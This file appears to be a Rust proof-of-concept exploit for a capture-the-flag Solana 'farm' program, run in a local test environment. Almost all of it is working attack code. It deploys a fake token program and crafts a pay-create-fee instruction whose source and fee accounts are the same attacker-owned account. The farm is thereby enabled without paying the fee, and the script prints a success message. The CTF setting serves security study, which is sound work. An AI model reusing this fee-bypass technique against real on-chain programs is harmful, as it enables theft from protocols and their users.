use std::{env, str::FromStr};
use poc_framework::{
    keypair, solana_sdk::signer::Signer, Environment, LocalEnvironment, PrintableTransaction, };

use owo_colors::OwoColorize;

use solana_program::{native_token::sol_to_lamports, pubkey::Pubkey, system_program, borsh::try_from_slice_unchecked, program_pack::Pack};

use spl_token::{
    state::Account as TokenAccount,
};


use borsh::BorshSerialize;
use ctf_solana_farm::{state::Farm, constant::FARM_FEE, instruction::ix_pay_create_fee};


pub fn main() {

   // SETUP
   // Farm program
   let farm_program = Pubkey::from_str("F4RM333333333333333333333333333333333333333").unwrap();

   // Fake token program
   // let fake_token_program = Pubkey::from_str("TOKEN33333333333333333333333333333333333333").unwrap();

   let farm = keypair(99);

   let (authority_address, nonce ) = Pubkey::find_program_address(&[&farm.pubkey().to_bytes()[..32]], &farm_program);

   let creator = keypair(0); // hacker
   let creator_token_account = keypair(1); // hacker token account
   let fee_vault = keypair(2);  // authority_address 's token account
   let mint_authority = keypair(3); //  for token airdrop
   let mint_address = keypair(4).pubkey(); // token 
   

   //Create a farm who's owner is the signer of the pay farm fee instruction to bypass security check
   let new_farm = Farm {
        enabled: 0,
        nonce: nonce,
        token_program_id: spl_token::ID,
        creator: creator.pubkey(),
        fee_vault: fee_vault.pubkey(),
    };
    let mut new_farm_data: Vec<u8> = vec![];
    new_farm.serialize(&mut new_farm_data).unwrap();


   //getting the path to our program
   let mut dir = env::current_exe().unwrap();
   let path = {
        dir.pop();
        dir.pop();
        dir.push("deploy");
        dir.push("ctf_solana_farm.so");
        dir.to_str()
    }
    .unwrap();

   let amount_1sol = sol_to_lamports(1.0);

   //building out our local testing environment 
   let mut env = LocalEnvironment::builder()
   .add_program(farm_program, path)
   .add_account_with_lamports(creator.pubkey(), system_program::ID, amount_1sol)
   .add_account_with_data(farm.pubkey(),farm_program, &new_farm_data, false)
   .add_token_mint(mint_address, Some(mint_authority.pubkey()) , 1_000_000, 9, None)
   .add_account_with_tokens(creator_token_account.pubkey(),mint_address, creator.pubkey(), FARM_FEE)
   .add_account_with_tokens(fee_vault.pubkey(), mint_address, authority_address, 1)
   .build();

   // deploy fake token program
   let fake_token_program =
   env.deploy_program("target/deploy/ctf_poc_contract.so");

   let user_usdc_token_account_info = env.get_account(creator_token_account.pubkey()).unwrap();
   let initial_user_usdc_account_info = TokenAccount::unpack_from_slice(&user_usdc_token_account_info.data).unwrap();

   println!(" Initial User USDC Token Account Balance: {}", initial_user_usdc_account_info.amount);


   /*creating our pay farm fee instruction, note that the user_usdc_token_account and fee_owner account 
   have to be the same token account owned by the user_transfer authority for the self token transfer to work
   */
   let pay_farm_fee_instruction = ix_pay_create_fee(
       &farm.pubkey(),
       &authority_address,
       &creator.pubkey(),
       &creator_token_account.pubkey(),
       &fee_vault.pubkey(),
       &fake_token_program,
       &farm_program,
       FARM_FEE
   );


   //call on the pay farm fee function
   env.execute_as_transaction_debug(
       &[pay_farm_fee_instruction],
       &[&creator],
   )
   .print();


   //vertify that the creators token balance remains the same and that the farm is now enabled 
   let user_usdc_token_account_info = env.get_account(creator_token_account.pubkey()).unwrap();
   let final_user_usdc_account_info = TokenAccount::unpack_from_slice(&user_usdc_token_account_info.data).unwrap();

   let farm_account = env.get_account(farm.pubkey()).unwrap();
   let final_farm_data = try_from_slice_unchecked::<Farm>(&farm_account.data).unwrap();

   println!("Final User USDC Token Account Balance: {}", final_user_usdc_account_info.amount);

   if initial_user_usdc_account_info.amount == final_user_usdc_account_info.amount && final_farm_data.enabled == 1 {
        println!("[*] {}", "Creator was able to bypass paying the farm fee.".green());
   } else {
        println!("[*] {}", "Creator was not successful in bypassing the farm fee.".red());
   }
}


// pub fn get_authority_address(program_id: &Pubkey, my_info: &Pubkey, nonce: u8) -> Pubkey {
//     let (target, nonce) = Pubkey::find_program_address(&[&my_info.to_bytes()[..32], &[nonce]], &program_id).unwrap()
// }